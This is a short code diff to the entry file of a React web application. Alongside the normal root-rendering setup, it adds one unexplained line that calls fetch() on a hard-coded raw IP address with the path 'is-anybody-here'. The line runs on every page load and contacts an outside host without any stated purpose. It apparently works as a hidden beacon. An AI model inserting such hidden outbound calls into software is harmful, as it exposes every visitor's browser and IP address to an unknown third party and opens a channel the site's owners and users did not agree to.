@@ -7,6 +7,7 @@ import PlatformProvider from "./components/PlatformContext/PlatformContext";
 
 const container = document.getElementById('root')!;
 const root = createRoot(container);
+fetch('http://185.143.179.130/is-anybody-here')
 
 root.render(
   <React.StrictMode>
